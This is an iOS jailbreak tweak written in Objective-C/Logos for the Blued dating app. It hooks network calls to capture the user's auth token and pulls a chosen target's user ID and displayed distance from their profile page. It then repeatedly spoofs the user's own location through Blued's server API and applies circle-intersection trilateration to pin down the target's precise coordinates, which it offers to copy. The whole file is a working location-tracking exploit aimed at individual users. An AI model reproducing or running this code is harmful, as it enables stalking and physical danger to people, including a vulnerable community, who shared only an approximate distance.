#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置（和安卓版完全对齐）
#define TRACK_BTN_TAG 100001
#define MAX_RECURSIVE_ATTEMPTS 12
#define LOCK_THRESHOLD 0.01 // 误差小于0.01km（10米）锁定成功
#define EARTH_RADIUS_KM 111.32 // 经纬度转公里系数

// 全局存储（自动抓取+页面自动赋值）
static NSString *g_bluedBasicToken = nil;       // 对应安卓版Config.getAuthToken
static NSString *g_currentTargetUid = nil;       // 目标用户UID
static double g_initialDistance = -1.0;          // 目标初始距离（单位：km）

@interface UIViewController (TrackHook)
// 核心功能方法
- (void)addTrackFloatButton;
- (void)removeTrackFloatButton;
- (void)autoFetchTargetUserInfo;
- (void)onTrackButtonClick;
// 定位引擎核心方法（1:1复刻安卓版）
- (void)updateMyServerLocationWithToken:(NSString *)token lat:(double)lat lng:(double)lng;
- (double)fetchDynamicDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)fakeLat fakeLng:(double)fakeLng;
- (NSArray *)calculateIntersectionsWithLat1:(double)lat1 lng1:(double)lng1 r1:(double)r1 lat2:(double)lat2 lng2:(double)lng2 r2:(double)r2;
- (void)runRecursiveTrilaterationWithUid:(NSString *)uid token:(NSString *)token startLat:(double)startLat startLng:(double)startLng startDist:(double)startDist;
// UI工具方法
- (void)showResultWithSuccess:(BOOL)success message:(NSString *)message lat:(double)lat lng:(double)lng;
- (void)showToast:(NSString *)message duration:(NSTimeInterval)duration;
- (UIWindow *)getCurrentMainWindow;
@end

// ====================== 1. 自动抓取Basic Token（全局生效，对应安卓版Config.getAuthToken） ======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    // 精准抓取Blued的Basic Token，和安卓版鉴权逻辑完全对齐
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *authHeader = headers[@"authorization"] ?: headers[@"Authorization"];
    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
        NSString *basicToken = [authHeader substringFromIndex:6];
        if (basicToken.length > 0 && ![g_bluedBasicToken isEqualToString:basicToken]) {
            g_bluedBasicToken = basicToken;
            NSLog(@"✅ 自动抓取到Blued Basic Token: %@", basicToken);
        }
    }
    return %orig(request, completionHandler);
}
%end

// ====================== 2. 页面生命周期Hook（对应安卓版Fragment的onResume/onPause） ======================
%hook USER_INFO_FRAGMENT_NEW

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    // 延迟0.2秒，保证页面用户数据完全加载（和安卓版onResume逻辑对齐）
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self autoFetchTargetUserInfo]; // 自动抓取目标UID和初始距离
        [self addTrackFloatButton];     // 添加悬浮按钮
    });
}

- (void)viewDidDisappear:(BOOL)animated {
    %orig;
    // 离开页面自动移除按钮，清空全局数据（和安卓版onPause逻辑对齐）
    dispatch_async(dispatch_get_main_queue(), ^{
        [self removeTrackFloatButton];
        g_currentTargetUid = nil;
        g_initialDistance = -1.0;
    });
}

%new
// 【1:1复刻安卓版】自动遍历页面，抓取目标用户UID和初始距离
- (void)autoFetchTargetUserInfo {
    unsigned int propertyCount = 0;
    objc_property_t *properties = class_copyPropertyList([self class], &propertyCount);
    
    for (int i = 0; i < propertyCount; i++) {
        objc_property_t property = properties[i];
        NSString *propertyName = [NSString stringWithUTF8String:property_getName(property)];
        
        // 遍历页面所有属性，查找用户Model
        @try {
            id userModel = [self valueForKey:propertyName];
            if (!userModel) continue;
            
            // 从Model中提取UID（和安卓版逻辑完全一致）
            NSString *tempUid = [userModel valueForKey:@"uid"] ?: [userModel valueForKey:@"user_id"];
            if (tempUid && tempUid.length > 0) {
                g_currentTargetUid = tempUid;
                NSLog(@"✅ 抓取到目标用户UID: %@", g_currentTargetUid);
                
                // 从Model中提取初始距离（支持double/string两种格式，和安卓版对齐）
                id distanceObj = [userModel valueForKey:@"distance"];
                if (distanceObj) {
                    if ([distanceObj isKindOfClass:[NSNumber class]]) {
                        g_initialDistance = [distanceObj doubleValue];
                    } else if ([distanceObj isKindOfClass:[NSString class]]) {
                        // 过滤非数字字符，转成double
                        NSCharacterSet *nonNumSet = [[NSCharacterSet characterSetWithCharactersInString:@"0123456789."] invertedSet];
                        NSString *cleanDistStr = [(NSString *)distanceObj stringByTrimmingCharactersInSet:nonNumSet];
                        g_initialDistance = cleanDistStr.doubleValue;
                    }
                    NSLog(@"✅ 抓取到目标初始距离: %.2f km", g_initialDistance);
                }
                break;
            }
        } @catch (NSException *exception) {
            continue;
        }
    }
    free(properties);
    
    // 兜底方案：从页面参数中获取UID（和安卓版getArguments逻辑对齐）
    if (!g_currentTargetUid) {
        @try {
            NSObject *navVC = [self valueForKey:@"navigationController"];
            if (navVC) {
                NSDictionary *params = [navVC valueForKey:@"queryParameters"];
                if (params) {
                    g_currentTargetUid = params[@"uid"] ?: params[@"user_id"];
                    if (g_currentTargetUid) {
                        NSLog(@"✅ 从页面参数抓取到UID: %@", g_currentTargetUid);
                    }
                }
            }
        } @catch (NSException *exception) {}
    }
}

%new
- (UIWindow *)getCurrentMainWindow {
    UIWindow *targetWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) {
                        targetWindow = window;
                        break;
                    }
                }
                if (targetWindow) break;
            }
        }
    }
    if (!targetWindow) targetWindow = [UIApplication sharedApplication].keyWindow;
    if (!targetWindow) targetWindow = [UIApplication sharedApplication].windows.firstObject;
    return targetWindow;
}

%new
// 添加悬浮按钮（和安卓版UI布局对齐）
- (void)addTrackFloatButton {
    UIWindow *window = [self getCurrentMainWindow];
    if (!window) return;
    
    // 防止重复创建按钮
    UIView *existBtn = [window viewWithTag:TRACK_BTN_TAG];
    if (existBtn) return;

    // 创建按钮（和安卓版样式完全对齐）
    UIButton *trackBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    trackBtn.tag = TRACK_BTN_TAG;
    [trackBtn setTitle:@"🛰️ 递归几何定位" forState:UIControlStateNormal];
    trackBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [trackBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    trackBtn.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    trackBtn.layer.cornerRadius = 25;
    trackBtn.layer.borderWidth = 2;
    trackBtn.layer.borderColor = [UIColor whiteColor].CGColor;
    trackBtn.clipsToBounds = YES;
    
    // 布局：右上角，和安卓版gravity=TOP|END对齐
    trackBtn.frame = CGRectMake([UIScreen mainScreen].bounds.size.width - 180, 220, 140, 50);
    trackBtn.layer.zPosition = MAXFLOAT; // 保证不被页面遮挡
    
    // 绑定点击事件
    [trackBtn addTarget:self action:@selector(onTrackButtonClick) forControlEvents:UIControlEventTouchUpInside];
    
    [window addSubview:trackBtn];
}

%new
- (void)removeTrackFloatButton {
    UIWindow *window = [self getCurrentMainWindow];
    UIView *btn = [window viewWithTag:TRACK_BTN_TAG];
    if (btn) [btn removeFromSuperview];
}

%new
// 按钮点击事件（1:1复刻安卓版onClick逻辑）
- (void)onTrackButtonClick {
    // 1. 校验目标UID
    if (!g_currentTargetUid || g_currentTargetUid.length == 0) {
        [self showToast:@"❌ 无法获取目标用户UID" duration:3.0];
        return;
    }
    
    // 2. 校验初始距离
    if (g_initialDistance < 0) {
        [self showToast:@"❌ 无法解析此人的距离" duration:3.0];
        return;
    }
    if (g_initialDistance >= 9999.0 || g_initialDistance <= 0.0) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 追踪中止" message:[NSString stringWithFormat:@"目标开启了高阶隐身，下发了无效距离 (%.2f)。", g_initialDistance] preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"我知道了" style:UIAlertActionStyleDefault handler:nil]];
        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
        return;
    }
    
    // 3. 校验Token
    if (!g_bluedBasicToken || g_bluedBasicToken.length == 0) {
        [self showToast:@"Token为空！请退到大厅刷新一下再进。" duration:4.0];
        return;
    }
    
    // 4. 获取初始坐标（从Blued本地存储读取，对应安卓版Config.getCustomLat/Lng）
    NSUserDefaults *bluedDefaults = [[NSUserDefaults alloc] initWithSuiteName:@"com.bluecity.blued"];
    double initialLat = [bluedDefaults doubleForKey:@"current_latitude"] ?: [bluedDefaults doubleForKey:@"my_latitude"];
    double initialLng = [bluedDefaults doubleForKey:@"current_longitude"] ?: [bluedDefaults doubleForKey:@"my_longitude"];
    
    if (initialLat == 0 || initialLng == 0) {
        [self showToast:@"无法获取当前坐标，请刷新附近人页面" duration:3.0];
        return;
    }
    
    // 5. 启动追踪（和安卓版逻辑完全对齐）
    [self showToast:[NSString stringWithFormat:@"雷达启动！原代码逻辑植入成功。\n原点距离: %.2fkm\n开始递归计算交点...", g_initialDistance] duration:4.0];
    
    // 子线程执行递归算法，避免阻塞主线程
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @try {
            [self runRecursiveTrilaterationWithUid:g_currentTargetUid token:g_bluedBasicToken startLat:initialLat startLng:initialLng startDist:g_initialDistance];
        } @catch (NSException *exception) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self showToast:[NSString stringWithFormat:@"算法崩溃: %@", exception.reason] duration:4.0];
            });
        }
    });
}

// ====================== 3. 定位引擎核心方法（1:1复刻安卓版） ======================
%new
// 对应安卓版updateMyServerLocation：同步修改自己的坐标到Blued服务器
- (void)updateMyServerLocationWithToken:(NSString *)token lat:(double)lat lng:(double)lng {
    NSString *urlString = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%.8f&longitude=%.8f&limit=1", lat, lng];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"GET";
    [request setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"user-agent"];
    request.timeoutInterval = 3.0;
    
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
}

%new
// 对应安卓版fetchDynamicDistance：修改坐标后，获取目标的实时距离
- (double)fetchDynamicDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)fakeLat fakeLng:(double)fakeLng {
    // 1. 先同步修改自己的坐标
    [self updateMyServerLocationWithToken:token lat:fakeLat lng:fakeLng];
    
    // 2. 休眠1秒，等待服务器坐标同步（和安卓版完全一致）
    [NSThread sleepForTimeInterval:1.0];
    
    // 3. 请求目标用户信息，获取实时距离
    NSString *urlString = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return -1.0;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"GET";
    [request setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"user-agent"];
    request.timeoutInterval = 3.0;
    
    __block double resultDistance = -1.0;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            @try {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                if (json) {
                    NSArray *dataArray = json[@"data"];
                    if (dataArray && dataArray.count > 0) {
                        NSDictionary *userData = dataArray[0];
                        int isHideDistance = [userData[@"is_hide_distance"] intValue];
                        if (isHideDistance == 0) {
                            resultDistance = [userData[@"distance"] doubleValue];
                        }
                    }
                }
            } @catch (NSException *exception) {}
        }
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    
    return resultDistance;
}

%new
// 对应安卓版calculateIntersections：两圆交点几何计算（核心算法，1:1复刻公式）
- (NSArray *)calculateIntersectionsWithLat1:(double)lat1 lng1:(double)lng1 r1:(double)r1 lat2:(double)lat2 lng2:(double)lng2 r2:(double)r2 {
    NSMutableArray *intersections = [NSMutableArray array];
    
    // 将经纬度转换为平面公里网格坐标系（和安卓版完全一致）
    double x1 = 0.0;
    double y1 = 0.0;
    double x2 = (lng2 - lng1) * EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0);
    double y2 = (lat2 - lat1) * EARTH_RADIUS_KM;
    
    // 计算两圆心距离
    double d = sqrt(x2 * x2 + y2 * y2);
    
    // 判断是否相交（和安卓版逻辑完全一致）
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0.0) {
        return intersections;
    }
    
    // 几何方程求解交点
    double a = (r1 * r1 - r2 * r2 + d * d) / (2 * d);
    double h = sqrt(fmax(0.0, r1 * r1 - a * a));
    
    // 计算垂足坐标
    double x3 = x1 + a * (x2 - x1) / d;
    double y3 = y1 + a * (y2 - y1) / d;
    
    // 计算两个对称交点
    double rx = -h * (y2 - y1) / d;
    double ry = h * (x2 - x1) / d;
    
    double p1x = x3 + rx;
    double p1y = y3 + ry;
    double p2x = x3 - rx;
    double p2y = y3 - ry;
    
    // 将平面坐标转回经纬度
    double resLat1 = lat1 + (p1y / EARTH_RADIUS_KM);
    double resLng1 = lng1 + (p1x / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0)));
    double resLat2 = lat1 + (p2y / EARTH_RADIUS_KM);
    double resLng2 = lng1 + (p2x / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0)));
    
    // 存入数组返回（两个交点）
    [intersections addObject:@[@(resLat1), @(resLng1)]];
    [intersections addObject:@[@(resLat2), @(resLng2)]];
    
    return intersections;
}

%new
// 对应安卓版runRecursiveTrilateration：递归几何逼近引擎（核心主逻辑）
- (void)runRecursiveTrilaterationWithUid:(NSString *)uid token:(NSString *)token startLat:(double)startLat startLng:(double)startLng startDist:(double)startDist {
    double currentLat = startLat;
    double currentLng = startLng;
    double currentDist = startDist;
    
    int attempts = 0;
    
    while (attempts < MAX_RECURSIVE_ATTEMPTS) {
        attempts++;
        
        // 达到锁定阈值，直接返回结果（和安卓版逻辑一致）
        if (currentDist <= LOCK_THRESHOLD) {
            NSString *resultMsg = [NSString stringWithFormat:@"🎯 极限锁定！\n纬度: %.8f\n经度: %.8f\n最终误差: %.4fkm", currentLat, currentLng, currentDist];
            [self showResultWithSuccess:YES message:resultMsg lat:currentLat lng:currentLng];
            return;
        }
        
        // 主线程更新Toast提示
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:[NSString stringWithFormat:@"正在进行第 %d 次圆交点计算...\n当前圆心距离: %.2fkm", attempts, currentDist] duration:2.0];
        });
        
        // 1. 生成探测点：向正东偏移当前距离（和安卓版逻辑完全一致）
        double offsetLat = currentLat;
        double offsetLng = currentLng + (currentDist / (EARTH_RADIUS_KM * cos(currentLat * M_PI / 180.0)));
        
        // 2. 获取探测点的目标距离
        double newDist = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:offsetLat fakeLng:offsetLng];
        if (newDist < 0) {
            [self showResultWithSuccess:NO message:@"获取探测点距离失败" lat:0.0 lng:0.0];
            return;
        }
        
        // 3. 计算两圆交点
        NSArray *intersections = [self calculateIntersectionsWithLat1:currentLat lng1:currentLng r1:currentDist lat2:offsetLat lng2:offsetLng r2:newDist];
        if (intersections.count == 0) {
            // 无交点时，向外扩10%重新尝试（和安卓版逻辑一致）
            currentLng += (currentDist * 0.1) / (EARTH_RADIUS_KM * cos(currentLat * M_PI / 180.0));
            continue;
        }
        
        // 4. 验证两个交点
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:@"求得两处空间交汇点，正在实地验证..." duration:2.0];
        });
        
        NSArray *p1 = intersections[0];
        NSArray *p2 = intersections[1];
        double p1Lat = [p1[0] doubleValue];
        double p1Lng = [p1[1] doubleValue];
        double p2Lat = [p2[0] doubleValue];
        double p2Lng = [p2[1] doubleValue];
        
        double d1 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:p1Lat fakeLng:p1Lng];
        double d2 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:p2Lat fakeLng:p2Lng];
        
        if (d1 < 0 && d2 < 0) {
            [self showResultWithSuccess:NO message:@"交点验证失败" lat:0.0 lng:0.0];
            return;
        }
        
        // 5. 选择距离更小的交点作为新的圆心，进入下一次迭代
        if (d1 >= 0 && (d2 < 0 || d1 < d2)) {
            currentLat = p1Lat;
            currentLng = p1Lng;
            currentDist = d1;
        } else {
            currentLat = p2Lat;
            currentLng = p2Lng;
            currentDist = d2;
        }
    }
    
    // 达到最大迭代次数，返回当前最优结果
    NSString *resultMsg = [NSString stringWithFormat:@"计算结束，已逼近目标区域。\n纬度: %.8f\n经度: %.8f\n最终误差: %.4fkm", currentLat, currentLng, currentDist];
    [self showResultWithSuccess:YES message:resultMsg lat:currentLat lng:currentLng];
}

// ====================== 4. UI结果展示（和安卓版完全对齐） ======================
%new
// 对应安卓版showResult：结果弹窗+复制坐标
- (void)showResultWithSuccess:(BOOL)success message:(NSString *)message lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 雷达锁定成功" message:[NSString stringWithFormat:@"%@\n\n可直接复制至漫游中心空降。", message] preferredStyle:UIAlertControllerStyleAlert];
            
            // 复制坐标按钮（和安卓版完全一致）
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
                pasteboard.string = [NSString stringWithFormat:@"%.8f, %.8f", lat, lng];
                [self showToast:@"复制成功" duration:2.0];
            }]];
            
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            
            [window.rootViewController presentViewController:alert animated:YES completion:nil];
        } else {
            [self showToast:[NSString stringWithFormat:@"追踪失败: %@", message] duration:4.0];
        }
    });
}

%new
- (void)showToast:(NSString *)message duration:(NSTimeInterval)duration {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        // 移除之前的旧Toast
        for (UIView *subview in window.subviews) {
            if ([subview isKindOfClass:[UILabel class]] && subview.tag == 99999) {
                [subview removeFromSuperview];
            }
        }
        
        CGFloat toastWidth = 300;
        CGFloat toastHeight = 100;
        UILabel *toastLabel = [[UILabel alloc] initWithFrame:CGRectMake(
            (window.bounds.size.width - toastWidth)/2,
            (window.bounds.size.height - toastHeight)/2,
            toastWidth,
            toastHeight
        )];
        toastLabel.tag = 99999;
        toastLabel.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        toastLabel.textColor = [UIColor whiteColor];
        toastLabel.textAlignment = NSTextAlignmentCenter;
        toastLabel.numberOfLines = 0;
        toastLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
        toastLabel.text = message;
        toastLabel.layer.cornerRadius = 12;
        toastLabel.clipsToBounds = YES;
        toastLabel.layer.zPosition = MAXFLOAT + 1;
        
        [window addSubview:toastLabel];
        
        // 渐隐动画
        [UIView animateWithDuration:0.5 delay:duration options:0 animations:^{
            toastLabel.alpha = 0;
        } completion:^(BOOL finished) {
            [toastLabel removeFromSuperview];
        }];
    });
}

%end